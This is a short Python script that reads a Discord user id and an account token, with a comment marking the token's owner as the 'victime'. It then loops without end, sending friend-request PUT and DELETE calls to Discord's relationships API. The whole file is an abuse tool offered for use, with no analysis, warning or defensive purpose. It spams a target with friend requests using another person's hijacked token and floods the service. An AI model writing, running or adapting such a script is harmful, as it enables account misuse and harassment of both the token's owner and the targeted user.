import requests

id_user = input("Random id user : ")
api_relation_ship = f"https://discord.com/api/v9/users/@me/relationships/{id_user}"
token = input("Token : ") # victime
payload = {}
header = {"Authorization": token, "Content-Type": 'application/json', 'username': 'Svperior', 'discriminator': '1113'}

while True:
    requests.put(api_relation_ship, headers=header, json=payload)
    requests.delete(api_relation_ship, headers=header, json=payload)
